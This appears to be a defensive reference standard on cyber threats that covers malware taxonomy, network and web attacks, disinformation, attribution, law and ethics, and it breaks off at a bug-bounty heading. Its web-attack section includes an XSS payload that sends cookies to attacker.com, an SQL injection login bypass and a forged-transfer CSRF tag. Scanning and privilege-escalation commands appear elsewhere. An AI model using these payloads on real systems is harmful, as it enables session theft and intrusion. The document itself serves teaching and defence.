# WIA-DEF-004: Cyber Weapon Specification v1.0

> **Standard ID:** WIA-DEF-004
> **Version:** 1.0.0
> **Published:** 2025-12-27
> **Status:** Active
> **Authors:** WIA Defense Research Group

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Malware Classification](#2-malware-classification)
3. [Attack Vector Analysis](#3-attack-vector-analysis)
4. [Network Exploitation](#4-network-exploitation)
5. [Information Warfare](#5-information-warfare)
6. [Vulnerability Exploitation](#6-vulnerability-exploitation)
7. [Attribution Methodology](#7-attribution-methodology)
8. [Legal Frameworks](#8-legal-frameworks)
9. [Ethical Guidelines](#9-ethical-guidelines)
10. [Defense Strategies](#10-defense-strategies)
11. [References](#11-references)

---

## 1. Introduction

### 1.1 Purpose

This specification defines the comprehensive framework for understanding, analyzing, and defending against cyber weapons in accordance with international law and ethical principles.

### 1.2 Scope

The standard covers:
- Malware taxonomy and classification
- Attack vector identification and analysis
- Network exploitation techniques
- Information warfare concepts and countermeasures
- Vulnerability exploitation patterns
- Threat actor attribution methods
- Legal and ethical frameworks
- Defensive strategies and best practices

### 1.3 Philosophy

**弘益人間 (Benefit All Humanity)** - This standard provides defensive knowledge to protect humanity from cyber threats while maintaining strict ethical boundaries. All information is for defensive purposes only and must comply with international law.

### 1.4 Terminology

- **Cyber Weapon**: Software, hardware, or operational capability designed to cause harm through digital means
- **Malware**: Malicious software designed to damage, disrupt, or gain unauthorized access
- **APT (Advanced Persistent Threat)**: Sophisticated, sustained cyber attack campaign
- **Zero-Day**: Previously unknown vulnerability with no available patch
- **TTPs**: Tactics, Techniques, and Procedures used by threat actors
- **Attribution**: Process of identifying the source of a cyber attack
- **IOC (Indicator of Compromise)**: Evidence of potential security breach

---

## 2. Malware Classification

### 2.1 Primary Categories

#### 2.1.1 Virus

**Definition**: Self-replicating malware that requires host program

Characteristics:
```
Propagation = Infection × Execution
Detection_Difficulty = Polymorphism + Encryption
```

Common Types:
- **File Infector**: Attaches to executable files
- **Boot Sector**: Infects boot records
- **Macro**: Embedded in document macros
- **Polymorphic**: Changes code to evade detection
- **Metamorphic**: Rewrites itself completely

Defense:
- Signature-based antivirus
- Behavioral analysis
- Application whitelisting
- Regular scanning

#### 2.1.2 Worm

**Definition**: Self-replicating malware that spreads independently

Characteristics:
```
Spread_Rate = Vulnerability_Exploitation × Network_Connectivity
Impact = Infected_Systems × Payload_Severity
```

Famous Examples:
- **Morris Worm** (1988): First major internet worm
- **ILOVEYOU** (2000): Email-based propagation
- **Conficker** (2008): Multi-vector exploitation
- **WannaCry** (2017): SMB EternalBlue exploit
- **NotPetya** (2017): Wiper disguised as ransomware

Defense:
- Network segmentation
- Patch management
- Traffic monitoring
- Automated containment

#### 2.1.3 Trojan Horse

**Definition**: Malware disguised as legitimate software

Types:
```
Trojan Types:
├── Backdoor: Remote access tools (RAT)
├── Downloader: Fetches additional malware
├── Banker: Steals financial credentials
├── Keylogger: Records keystrokes
├── Rootkit: Hides malicious activity
├── Ransomware: Encrypts data for extortion
└── Spyware: Surveillance and data theft
```

Common Delivery Methods:
- Fake software updates
- Pirated applications
- Malicious email attachments
- Drive-by downloads
- Social engineering

Defense:
- Software verification (digital signatures)
- User awareness training
- Application sandboxing
- Network traffic analysis

#### 2.1.4 Ransomware

**Definition**: Malware that encrypts data and demands payment

Ransomware Evolution:
```
Generation 1 (2005-2012): Simple file encryption
Generation 2 (2013-2016): Crypto ransomware (CryptoLocker)
Generation 3 (2017-2019): Worm capabilities (WannaCry)
Generation 4 (2020-2023): Double extortion (data theft + encryption)
Generation 5 (2024+): Triple extortion (DDoS + data + encryption)
```

Attack Chain:
```
Initial Access → Lateral Movement → Data Exfiltration → Encryption → Ransom Demand
```

Notable Families:
| Family | First Seen | Encryption | Ransom | Notes |
|--------|-----------|------------|--------|-------|
| WannaCry | 2017 | RSA-2048 | $300-$600 BTC | EternalBlue exploit |
| Ryuk | 2018 | RSA-4096 + AES-256 | $100K-$5M | Targeted attacks |
| REvil/Sodinokibi | 2019 | Salsa20 + ECC | Variable | RaaS model |
| Conti | 2020 | AES-256 | Variable | Affiliate network |
| LockBit | 2021 | AES + RSA | Variable | Fastest encryption |

Defense Strategy:
```
Prevention:
- Offline backups (3-2-1 rule)
- Email filtering
- Endpoint protection
- Privilege restriction

Detection:
- Behavioral analysis
- File integrity monitoring
- Network anomaly detection
- Honeypots

Response:
- Isolation procedures
- Forensic preservation
- Law enforcement notification
- NO PAYMENT policy
```

#### 2.1.5 Advanced Persistent Threat (APT)

**Definition**: Sophisticated, sustained cyber espionage campaign

APT Lifecycle:
```
Phase 1: Reconnaissance → Target profiling, infrastructure mapping
Phase 2: Initial Compromise → Spear phishing, zero-day exploitation
Phase 3: Establish Foothold → Backdoor installation, persistence
Phase 4: Escalate Privileges → Credential theft, lateral movement
Phase 5: Internal Reconnaissance → Network mapping, data discovery
Phase 6: Complete Mission → Data exfiltration, system manipulation
Phase 7: Maintain Presence → Long-term access, cover tracks
```

Nation-State APT Groups (Defensive Knowledge):
| Group | Origin | Targets | TTPs | Notable Campaigns |
|-------|--------|---------|------|-------------------|
| APT1 (Comment Crew) | China | Defense, Tech | Spear phishing, RATs | Operation Aurora |
| APT28 (Fancy Bear) | Russia | Government, Military | Zero-days, DNC breach | Olympic Destroyer |
| APT29 (Cozy Bear) | Russia | Government, Think tanks | Stealth, persistence | SolarWinds |
| Lazarus Group | North Korea | Financial, Media | Wipers, ransomware | Sony Pictures, WannaCry |
| APT33 (Elfin) | Iran | Energy, Aviation | Destructive malware | Shamoon |
| Equation Group | Unknown | Global | Advanced implants | Stuxnet collaboration |

APT Indicators:
```
Technical:
- Custom malware families
- Zero-day exploits
- Living-off-the-land techniques
- Advanced evasion tactics

Operational:
- Long-term persistence (months/years)
- Resource-intensive operations
- Coordinated multi-stage attacks
- Professional tradecraft

Strategic:
- Nation-state aligned targets
- Geopolitical timing
- High-value intelligence focus
- Attribution obfuscation
```

Defense:
- Assume breach mentality
- Zero trust architecture
- Threat hunting programs
- Advanced EDR/XDR
- Threat intelligence integration

### 2.2 Malware Behavior Analysis

#### 2.2.1 Persistence Mechanisms

Common Techniques (MITRE ATT&CK):
```
Windows:
- Registry Run Keys: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
- Scheduled Tasks: schtasks /create
- WMI Event Subscriptions: Fileless persistence
- Service Creation: sc create
- DLL Hijacking: Search order manipulation
- Boot/Logon Scripts: Group Policy objects

Linux:
- Cron Jobs: /etc/crontab, /var/spool/cron
- Init Scripts: /etc/init.d/, systemd services
- Profile Files: .bashrc, .bash_profile
- SSH Keys: ~/.ssh/authorized_keys
- LD_PRELOAD: Library injection

macOS:
- Launch Agents/Daemons: ~/Library/LaunchAgents
- Login Items: System Preferences
- Kernel Extensions: Deprecated in modern macOS
```

Detection:
```bash
# Windows: Monitor autoruns
autorunsc -a * -c -h -accepteula

# Linux: Check cron jobs
crontab -l
ls -la /etc/cron.*

# macOS: List launch agents
launchctl list
```

#### 2.2.2 Evasion Techniques

Anti-Analysis Methods:
```
1. Anti-Debugging:
   - IsDebuggerPresent() API checks
   - PEB (Process Environment Block) inspection
   - Timing attacks (rdtsc instruction)
   - Exception-based detection

2. Anti-VM:
   - VMware/VirtualBox artifact detection
   - CPU instruction differences
   - MAC address checks (00:0C:29 = VMware)
   - Registry key inspection

3. Code Obfuscation:
   - Packing/Compression (UPX, Themida)
   - Encryption (XOR, AES)
   - Polymorphism (code mutation)
   - Metamorphism (code rewriting)

4. Sandbox Evasion:
   - Sleep/delay before execution
   - User interaction requirements
   - Environmental checks (files, processes)
   - Resource-intensive operations
```

Entropy Analysis:
```
Entropy = -Σ(p(x) × log₂(p(x)))

Where:
- p(x) = Probability of byte value x
- High entropy (>7.0) = Likely encrypted/packed
- Low entropy (<5.0) = Likely plaintext
```

#### 2.2.3 Payload Classification

Payload Types:
```
Destructive:
- Wiper: Data destruction (disk formatting, file deletion)
- Logic Bomb: Time/condition-triggered damage
- Bootkiller: MBR/boot sector corruption

Espionage:
- Keylogger: Keystroke recording
- Screen Capture: Screenshot collection
- Credential Stealer: Password/token theft
- Document Harvester: Sensitive file collection

Financial:
- Banking Trojan: Transaction manipulation
- Cryptocurrency Miner: Resource hijacking
- POS Malware: Payment card theft

Disruption:
- DDoS Bot: Distributed denial of service
- Spam Bot: Email/message flooding
- Proxy Bot: Traffic routing
```

---

## 3. Attack Vector Analysis

### 3.1 Network-Based Vectors

#### 3.1.1 Exploitation Over Network

Common Services Targeted:
```
Port 21 (FTP): Anonymous access, credential theft
Port 22 (SSH): Brute force, key theft
Port 23 (Telnet): Cleartext credentials
Port 25 (SMTP): Email relay abuse
Port 80/443 (HTTP/HTTPS): Web application attacks
Port 135-139, 445 (SMB): EternalBlue, credential relay
Port 1433 (MSSQL): SQL injection, xp_cmdshell
Port 3306 (MySQL): SQL injection
Port 3389 (RDP): Brute force, BlueKeep
Port 5432 (PostgreSQL): SQL injection
```

Exploitation Frameworks (Defensive Knowledge):
```
Metasploit:
- Modular architecture
- 2,000+ exploits
- Post-exploitation modules
- Payload generation

Cobalt Strike:
- Adversary simulation
- Beacon payloads
- Lateral movement
- Often abused by threat actors

Empire/PowerShell Empire:
- PowerShell-based
- Fileless attacks
- Post-exploitation
```

Defense:
```
- Network segmentation (VLANs, firewalls)
- Intrusion Detection/Prevention Systems (IDS/IPS)
- Port security and monitoring
- Regular vulnerability scanning
- Disable unnecessary services
```

#### 3.1.2 Man-in-the-Middle (MitM)

Attack Types:
```
1. ARP Spoofing:
   Tool: arpspoof, ettercap
   Mitigation: Dynamic ARP Inspection (DAI)

2. DNS Spoofing:
   Tool: dnsspoof
   Mitigation: DNSSEC, DNS over HTTPS

3. SSL Stripping:
   Tool: sslstrip
   Mitigation: HSTS, certificate pinning

4. Session Hijacking:
   Method: Cookie theft, TCP hijacking
   Mitigation: Session encryption, token rotation
```

Detection:
```python
# Detect ARP spoofing
def detect_arp_spoof():
    arp_table = get_arp_table()
    for ip, mac in arp_table.items():
        if mac != expected_mac[ip]:
            alert(f"Possible ARP spoofing: {ip} -> {mac}")
```

#### 3.1.3 Denial of Service (DoS/DDoS)

Attack Categories:
```
Volume-Based:
- UDP Flood: High packet rate
- ICMP Flood: Ping flood
- DNS Amplification: 1:50 amplification ratio

Protocol-Based:
- SYN Flood: TCP handshake exhaustion
- Ping of Death: Oversized packets
- Smurf Attack: ICMP broadcast

Application-Layer:
- HTTP Flood: GET/POST requests
- Slowloris: Slow HTTP connections
- DNS Query Flood: Recursive queries
```

DDoS Calculation:
```
Attack_Bandwidth = Bots × Bot_Bandwidth × Amplification_Factor

Example:
- Bots: 100,000 (Mirai botnet)
- Bot Bandwidth: 1 Mbps
- Amplification: 50× (DNS)
- Total: 100,000 × 1 × 50 = 5 Tbps
```

Largest Recorded DDoS Attacks:
| Date | Target | Size | Method |
|------|--------|------|--------|
| Feb 2020 | AWS | 2.3 Tbps | CLDAP reflection |
| Sep 2017 | Google | 2.54 Tbps | Memcached amplification |
| Mar 2018 | GitHub | 1.35 Tbps | Memcached amplification |

Defense:
```
Network Level:
- Rate limiting
- Traffic filtering (ACLs, BGP blackhole)
- Anycast distribution
- ISP/CDN mitigation (Cloudflare, Akamai)

Application Level:
- CAPTCHA challenges
- Connection limits
- Request validation
- Caching (CDN)

Infrastructure:
- Overprovisioning bandwidth
- Geographically distributed servers
- Cloud-based auto-scaling
```

### 3.2 Application-Based Vectors

#### 3.2.1 Web Application Attacks

OWASP Top 10 (2021):
```
A01: Broken Access Control
- Impact: Unauthorized data access
- Example: IDOR, path traversal
- Mitigation: Proper authorization checks

A02: Cryptographic Failures
- Impact: Data exposure
- Example: Weak encryption, cleartext storage
- Mitigation: Strong crypto, TLS

A03: Injection
- Impact: Code execution, data breach
- Example: SQL, LDAP, OS command injection
- Mitigation: Input validation, parameterized queries

A04: Insecure Design
- Impact: Architectural vulnerabilities
- Example: Missing security controls
- Mitigation: Threat modeling, secure design

A05: Security Misconfiguration
- Impact: System compromise
- Example: Default credentials, verbose errors
- Mitigation: Hardening, least privilege

A06: Vulnerable Components
- Impact: Known vulnerability exploitation
- Example: Outdated libraries (Log4Shell)
- Mitigation: Dependency scanning, patching

A07: Authentication Failures
- Impact: Account takeover
- Example: Weak passwords, session fixation
- Mitigation: MFA, secure session management

A08: Software and Data Integrity Failures
- Impact: Supply chain attacks
- Example: Unsigned updates, deserializat
ion
- Mitigation: Code signing, integrity checks

A09: Security Logging Failures
- Impact: Undetected breaches
- Example: Insufficient logging
- Mitigation: Comprehensive logging, SIEM

A10: Server-Side Request Forgery (SSRF)
- Impact: Internal system access
- Example: Cloud metadata exploitation
- Mitigation: Input validation, network controls
```

SQL Injection Example (Educational):
```sql
-- Vulnerable query:
SELECT * FROM users WHERE username = '$user' AND password = '$pass'

-- Attack payload:
username: admin' --
password: anything

-- Resulting query:
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
-- Comment eliminates password check

-- Defense (Parameterized):
stmt = conn.prepare("SELECT * FROM users WHERE username = ? AND password = ?")
stmt.setString(1, username)
stmt.setString(2, password)
```

#### 3.2.2 Client-Side Attacks

Cross-Site Scripting (XSS):
```javascript
// Stored XSS (most dangerous)
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// Reflected XSS
https://victim.com/search?q=<script>alert(document.cookie)</script>

// DOM-based XSS
location.href = 'https://victim.com#' + <malicious_code>

// Defense:
// 1. Output encoding
const safe = escapeHTML(userInput);

// 2. Content Security Policy (CSP)
Content-Security-Policy: default-src 'self'; script-src 'self'

// 3. HTTPOnly cookies
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

Cross-Site Request Forgery (CSRF):
```html
<!-- Malicious site triggers action on victim site -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">

<!-- Defense: CSRF Token -->
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="random_token_123">
  <input type="text" name="to">
  <input type="number" name="amount">
</form>
```

### 3.3 Social Engineering

#### 3.3.1 Phishing Classification

Phishing Types:
```
Bulk Phishing:
- Target: Mass distribution
- Sophistication: Low
- Success Rate: 0.1-1%
- Example: "Your account has been suspended"

Spear Phishing:
- Target: Specific individuals/organizations
- Sophistication: Medium-High
- Success Rate: 10-30%
- Example: Fake email from CEO to CFO

Whaling:
- Target: C-level executives
- Sophistication: Very High
- Success Rate: 40-50%
- Example: Fake subpoena, M&A documents

Clone Phishing:
- Target: Previous email recipients
- Sophistication: Medium
- Method: Legitimate email with malicious attachment

Vishing (Voice Phishing):
- Target: Phone-based
- Method: Social engineering over phone
- Example: Fake tech support, IRS scam

Smishing (SMS Phishing):
- Target: Mobile users
- Method: Text message with malicious link
- Example: Package delivery notification
```

Phishing Indicators:
```
Email Analysis:
✓ Sender address mismatch
✓ Generic greetings ("Dear customer")
✓ Urgency/threats ("Account will be closed")
✓ Suspicious links (hover to reveal)
✓ Unexpected attachments
✓ Grammar/spelling errors
✓ Requests for sensitive information

Technical Indicators:
✓ SPF/DKIM/DMARC failures
✓ Newly registered domains
✓ Domain typosquatting
✓ Mismatched display name and email
✓ Hidden recipients (BCC)
```

#### 3.3.2 Pretexting and Baiting

Pretexting Scenarios:
```
1. IT Support Scam:
   "This is IT, we need your password to fix the server"

2. Authority Impersonation:
   "This is the CEO, I need you to wire money urgently"

3. Vendor Impersonation:
   "Your invoice is attached" (malware attachment)

4. Emergency Scenario:
   "I'm locked out, please reset my password quickly"
```

Baiting Examples:
```
Physical:
- USB drops in parking lot (labeled "Salaries 2024")
- Free software downloads (infected)
- Fake charging stations (juice jacking)

Digital:
- "Free movie downloads"
- "Click here for $100 Amazon gift card"
- Fake software updates
```

Defense:
```
Technical:
- Email filtering (SPF, DMARC, DKIM)
- Link analysis and sandboxing
- Attachment scanning
- URL rewriting for safety checks

Organizational:
- Security awareness training (quarterly)
- Phishing simulation exercises
- Incident reporting procedures
- Verification protocols (callback procedures)
```

---

## 4. Network Exploitation

### 4.1 Network Reconnaissance

#### 4.1.1 Passive Reconnaissance

Techniques (Defensive Awareness):
```
OSINT (Open Source Intelligence):
- DNS enumeration (dig, nslookup)
- WHOIS lookups
- Search engine dorking
- Social media mining
- Job postings analysis
- Public code repositories

Network Observation:
- Packet sniffing (passive mode)
- Traffic analysis
- Protocol fingerprinting
- Metadata collection
```

Defense:
```
- Minimize public information exposure
- Employee security awareness
- Privacy-focused information sharing
- Monitor for reconnaissance activity
```

#### 4.1.2 Active Reconnaissance

Port Scanning:
```
Scan Types:
- TCP Connect: Full three-way handshake
- SYN Scan: Half-open scanning
- UDP Scan: Connectionless probing
- FIN/NULL/Xmas: Firewall evasion

Example (nmap):
nmap -sS -sV -O -p- target.com
```

Defense:
```
Detection:
- Monitor for scan patterns
- Rate limiting
- Honeypots
- Port knocking

Prevention:
- Firewall rules
- Disable unnecessary services
- Network segmentation
```

### 4.2 Network Protocol Exploitation

#### 4.2.1 TCP/IP Stack Attacks

Protocol Vulnerabilities:
```
IP Layer:
- IP Spoofing: Source address forgery
- Fragmentation: Fragment overlap attacks
- ICMP Abuse: Redirect, timestamp requests

TCP Layer:
- SYN Flood: Connection table exhaustion
- RST Injection: Connection termination
- Sequence Prediction: Session hijacking

UDP Layer:
- Amplification: DNS, NTP, memcached
- Spoofing: No connection validation
```

Defense Mechanisms:
```
- TCP SYN Cookies (Linux: sysctl net.ipv4.tcp_syncookies=1)
- Rate limiting
- Ingress/egress filtering (BCP 38)
- Protocol-specific validations
```

#### 4.2.2 Wireless Network Attacks

Wi-Fi Attack Vectors:
```
WEP (Deprecated):
- IV collision attacks
- FMS/KoreK attacks
- Recovery time: <5 minutes

WPA/WPA2:
- KRACK (Key Reinstallation Attack)
- Handshake capture + offline cracking
- PMKID attack (no handshake needed)
- Evil Twin attacks

WPA3:
- Dragonblood vulnerabilities (patched)
- Downgrade attacks
- Side-channel attacks
```

Defense:
```
- Use WPA3 with strong passwords (20+ characters)
- Disable WPS (Wi-Fi Protected Setup)
- MAC filtering (limited effectiveness)
- 802.1X authentication (Enterprise)
- Hidden SSID (security through obscurity - limited)
- Regular firmware updates
- Wireless IDS (Kismet, Wireshark)
```

---

## 5. Information Warfare

### 5.1 Disinformation Campaigns

#### 5.1.1 Tactical Disinformation

Campaign Lifecycle:
```
Phase 1: Preparation
- Target selection
- Narrative development
- Asset creation (fake accounts, websites)
- Infrastructure setup

Phase 2: Seeding
- Initial content distribution
- Influencer recruitment
- Bot network activation
- Cross-platform coordination

Phase 3: Amplification
- Trending manipulation
- Astroturfing (fake grassroots)
- Media coverage
- Viral spreading

Phase 4: Persistence
- Counter-narrative suppression
- Sustained messaging
- Adaptation to fact-checking
```

Detection Indicators:
```
- Coordinated inauthentic behavior
- Bot/fake account patterns
- Rapid amplification curves
- Cross-platform synchronization
- Domain age and registration patterns
- Content similarity analysis
```

#### 5.1.2 Deep Fakes

Synthetic Media Types:
```
Video Deep Fakes:
- Face swapping
- Lip-sync manipulation
- Full body synthesis
- Voice cloning

Detection Methods:
- Facial inconsistencies
- Blinking patterns
- Audio artifacts
- Compression anomalies
- Temporal coherence analysis
```

Defense:
```
Technical:
- Deep fake detection AI
- Digital watermarking
- Blockchain-based content verification
- Multi-factor authentication for important communications

Organizational:
- Verification protocols
- Multiple source confirmation
- Chain of custody documentation
```

### 5.2 Psychological Operations (PSYOPS)

#### 5.2.1 Influence Operations

Techniques (Defensive Awareness):
```
1. Echo Chamber Creation:
   - Algorithm exploitation
   - Filter bubble reinforcement
   - Dissenting voice suppression

2. Emotional Manipulation:
   - Fear amplification
   - Outrage farming
   - Tribalism exploitation

3. Trust Erosion:
   - Media credibility attacks
   - Institution delegitimization
   - Expert discreditation

4. Narrative Hijacking:
   - Hashtag hijacking
   - Topic sliding
   - Forum dilution
```

Countermeasures:
```
Individual:
- Media literacy
- Source verification
- Emotional awareness
- Diverse information diet

Organizational:
- Rapid response teams
- Fact-checking partnerships
- Transparent communication
- Trust-building initiatives
```

---

## 6. Vulnerability Exploitation

### 6.1 Vulnerability Classification

#### 6.1.1 CVSS Scoring

Common Vulnerability Scoring System v3.1:
```
Base Score = f(Exploitability, Impact)

Exploitability Metrics:
- Attack Vector (AV): Network, Adjacent, Local, Physical
- Attack Complexity (AC): Low, High
- Privileges Required (PR): None, Low, High
- User Interaction (UI): None, Required

Impact Metrics:
- Confidentiality (C): None, Low, High
- Integrity (I): None, Low, High
- Availability (A): None, Low, High

Temporal Metrics:
- Exploit Code Maturity
- Remediation Level
- Report Confidence

Environmental Metrics:
- Modified Base Metrics
- Confidentiality/Integrity/Availability Requirements
```

Severity Ratings:
| Score | Rating | Action |
|-------|--------|--------|
| 0.0 | None | No action required |
| 0.1-3.9 | Low | Schedule patching |
| 4.0-6.9 | Medium | Patch within 30 days |
| 7.0-8.9 | High | Patch within 7 days |
| 9.0-10.0 | Critical | Patch within 24 hours |

#### 6.1.2 Zero-Day Vulnerabilities

Zero-Day Lifecycle:
```
Discovery → Weaponization → Disclosure → Patch → Deployment

Threat Window:
Time = Disclosure → Patch_Available → Patch_Deployed
Average: 0-day disclosure to patch = 7-30 days
Average: Patch available to deployed = 30-90 days
```

Notable Zero-Days:
| Year | Name | CVE | Impact | CVSS |
|------|------|-----|--------|------|
| 2014 | Heartbleed | CVE-2014-0160 | SSL/TLS memory leak | 7.5 |
| 2017 | EternalBlue | CVE-2017-0144 | SMB RCE | 9.3 |
| 2021 | Log4Shell | CVE-2021-44228 | JNDI injection RCE | 10.0 |
| 2021 | ProxyLogon | CVE-2021-26855 | Exchange Server RCE | 9.8 |
| 2022 | Spring4Shell | CVE-2022-22965 | Spring RCE | 9.8 |

Defense:
```
- Virtual patching (WAF rules)
- Network segmentation
- Compensating controls
- Threat intelligence monitoring
- Rapid patching processes
- Zero trust architecture
```

### 6.2 Exploitation Techniques

#### 6.2.1 Memory Corruption

Buffer Overflow:
```c
// Vulnerable code (educational example)
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
}

// Attack payload structure:
[NOP sled][Shellcode][Return address (overwrite)]

// Defense:
// 1. Use safe functions
strncpy(buffer, input, sizeof(buffer) - 1);

// 2. Stack canaries (compiler protection)
// 3. ASLR (Address Space Layout Randomization)
// 4. DEP/NX (Data Execution Prevention)
```

Heap Spray:
```
Technique: Fill heap with NOP sleds and shellcode
Goal: Increase exploitation reliability
Defense: Heap ASLR, heap integrity checks
```

#### 6.2.2 Privilege Escalation

Vertical Escalation:
```
User → Admin/Root

Common Techniques:
- SUID binary exploitation
- Kernel vulnerabilities
- Misconfigured sudo
- DLL hijacking (Windows)
- Token impersonation (Windows)
```

Horizontal Escalation:
```
User A → User B (same privilege level)

Common Techniques:
- Session hijacking
- Credential theft
- CSRF attacks
```

Linux Privilege Escalation Checks:
```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Sudo permissions
sudo -l

# Kernel version
uname -a
searchsploit kernel

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Writable /etc/passwd
ls -la /etc/passwd
```

---

## 7. Attribution Methodology

### 7.1 Technical Attribution

#### 7.1.1 Malware Analysis

Forensic Indicators:
```
Static Analysis:
- File hashes (MD5, SHA-256)
- Compilation timestamps
- Code signing certificates
- Embedded strings
- Resource sections
- PE headers

Dynamic Analysis:
- Network indicators (C2 domains, IPs)
- File system artifacts
- Registry modifications
- Process behavior
- API calls
```

Code Similarity:
```
Techniques:
- Function hashing (TLSH, ssdeep)
- Control flow graph comparison
- String matching
- Compiler artifact analysis
- Code reuse detection

Tools:
- IDA Pro
- Ghidra
- Binary Ninja
- YARA rules
```

#### 7.1.2 Infrastructure Analysis

Network Attribution:
```
Infrastructure Fingerprinting:
- IP address geolocation
- Domain registration (WHOIS)
- SSL certificate analysis
- Hosting provider identification
- ASN (Autonomous System Number) tracking

Shared Infrastructure:
- C2 server reuse
- Common infrastructure patterns
- Operational security mistakes
- Timing analysis (timezone correlation)
```

### 7.2 Operational Attribution

#### 7.2.1 TTP Analysis

MITRE ATT&CK Mapping:
```
Tactics (What):
- Initial Access
- Execution
- Persistence
- Privilege Escalation
- Defense Evasion
- Credential Access
- Discovery
- Lateral Movement
- Collection
- Command and Control
- Exfiltration
- Impact

Techniques (How):
- 200+ specific techniques
- Sub-techniques for granularity
- Procedure examples from real incidents

Procedures (Implementation):
- Specific implementation details
- Tool usage patterns
- Operational sequences
```

Actor Profiling:
```
Behavioral Patterns:
- Target selection (industry, geography)
- Campaign timing (working hours, holidays)
- Tool preferences
- Language artifacts (comments, UI)
- Operational security level

Capability Assessment:
- Technical sophistication
- Resource availability
- Custom tool development
- Zero-day access
- Persistence duration
```

#### 7.2.2 Attribution Confidence

Confidence Levels:
```
Low (20-40%):
- Limited technical indicators
- Common tools/techniques
- No operational pattern match
- High false flag potential

Medium (40-70%):
- Multiple technical indicators
- Some TTP correlation
- Partial infrastructure overlap
- Moderate confidence in motivation

High (70-90%):
- Extensive technical evidence
- Strong TTP correlation
- Unique tool signatures
- Clear motivation and capability alignment

Very High (90-100%):
- Overwhelming technical evidence
- Perfect TTP match
- Unique operational signatures
- Corroborated by multiple sources
- Geopolitical context alignment
```

Attribution Challenges:
```
False Flags:
- Deliberate misdirection
- Code/tool reuse
- Language/timezone manipulation
- Infrastructure compromise

Attribution Difficulties:
- Proxy/VPN usage
- Tor/anonymization networks
- Compromised infrastructure
- Tool sharing among actors
- Ransomware-as-a-Service (RaaS)
```

---

## 8. Legal Frameworks

### 8.1 International Law

#### 8.1.1 Geneva Conventions (Cyber Context)

Principles:
```
Distinction:
- Must distinguish between military and civilian targets
- Cyber attacks on civilian infrastructure = war crime

Proportionality:
- Collateral damage must not be excessive
- Must weigh military advantage vs civilian harm

Necessity:
- Attack must be necessary for military objective
- No alternative less harmful methods

Humanity:
- Prohibit unnecessary suffering
- Respect for human dignity
```

#### 8.1.2 Tallinn Manual

Tallinn Manual 2.0 Key Rules:
```
Rule 1: Sovereignty
- State cyber operations violating another state's sovereignty are prohibited

Rule 10: Due Diligence
- States must not allow their territory for cyber operations harmful to other states

Rule 13: Countermeasures
- States may take proportionate countermeasures in response to cyber operations

Rule 68: Armed Attack
- Cyber operations causing death, injury, or significant destruction = armed attack
- Triggers right of self-defense (UN Charter Article 51)

Rule 71: Cyber Espionage
- Peacetime cyber espionage not prohibited by international law
- But may violate domestic law
```

#### 8.1.3 Budapest Convention

Convention on Cybercrime (2001):
```
Criminal Offenses:
1. Illegal access (unauthorized access)
2. Illegal interception (data interception)
3. Data interference (deletion, alteration)
4. System interference (DDoS, malware)
5. Misuse of devices (hacking tools)
6. Computer-related forgery
7. Computer-related fraud
8. Child pornography
9. Copyright infringement

Procedural Powers:
- Expedited preservation of data
- Production orders
- Search and seizure
- Real-time traffic data collection
- Interception of content data

International Cooperation:
- Mutual legal assistance
- Extradition
- 24/7 network of contact points
```

### 8.2 National Laws

#### 8.2.1 United States

Computer Fraud and Abuse Act (CFAA):
```
18 U.S.C. § 1030 Prohibits:
(a)(1) Unauthorized access to obtain classified information
(a)(2) Unauthorized access to obtain information from financial/government computers
(a)(3) Unauthorized access to non-public government computers
(a)(4) Fraud via unauthorized access
(a)(5) Damage via unauthorized access
(a)(6) Trafficking in passwords
(a)(7) Extortion involving threat to damage computer

Penalties:
- First offense: Up to 5 years
- Repeat offense: Up to 10 years
- Damage > $5,000: Felony charges
```

#### 8.2.2 European Union

GDPR (Data Protection):
```
Cybersecurity Obligations:
- Article 32: Security of processing
- Article 33: Breach notification (72 hours)
- Article 34: Communication to data subjects

NIS Directive (Network and Information Security):
- Critical infrastructure protection
- Incident reporting requirements
- Security risk management
```

### 8.3 Rules of Engagement (ROE)

Cyber ROE Considerations:
```
Authorization Levels:
- Strategic: National leadership
- Operational: Military command
- Tactical: Unit/team level

Engagement Criteria:
- Target identification (positive ID)
- Collateral damage assessment
- Legal review
- Proportionality assessment

Prohibited Actions:
- Attacks on civilian targets
- Attacks on protected sites (hospitals, cultural)
- Indiscriminate attacks
- Unnecessary destruction

Reporting Requirements:
- Pre-operation approval
- Real-time monitoring
- Post-operation assessment
- Incident documentation
```

---

## 9. Ethical Guidelines

### 9.1 Defensive Ethics

#### 9.1.1 Responsible Disclosure

Vulnerability Disclosure Process:
```
Step 1: Discovery (Day 0)
- Document vulnerability
- Assess severity
- Determine affected systems

Step 2: Vendor Notification (Day 1-7)
- Contact vendor security team
- Provide technical details
- Propose disclosure timeline

Step 3: Vendor Response (Day 7-30)
- Acknowledgment
- Validation
- Patch development timeline

Step 4: Public Disclosure (Day 90)
- Coordinate with vendor
- Publish advisory
- Provide mitigations

Exceptions:
- Critical vulnerabilities: Shorter timeline (30-45 days)
- Actively exploited: Immediate notification to affected parties
- Vendor unresponsive: Public disclosure after reasonable time
```

#### 9.1.2 Penetration Testing Ethics

Ethical Pentesting Principles:
```
1. Authorized Access Only:
   - Written permission required
   - Scope clearly defined
   - Rules of engagement documented

2. Minimize Harm:
   - Avoid service disruption
   - No data destruction
   - Respect for privacy

3. Confidentiality:
   - Protect client information
   - Secure storage of findings
   - NDAs and contracts

4. Professional Standards:
   - OSSTMM, PTES, OWASP
   - Certifications (OSCP, CEH, GPEN)
   - Continuous education

5. Reporting:
   - Comprehensive documentation
   - Actionable recommendations
   - Executive and technical reports
```

### 9.2 Research Ethics

#### 9.2.1 Security Research Guidelines

Ethical Boundaries:
```
Permitted:
✓ Vulnerability research on own systems
✓ Bug bounty program participation
✓ Responsible disclosure
✓ Defensive tool development
✓ Academic research with proper safeguards

Prohibited:
✗ Unauthorized access to systems
✗ Data theft or destruction
✗ Malware distribution
✗ Weaponization without authorization
✗ Exploitation for personal gain
```

Bug Bounty Best Practices:
```
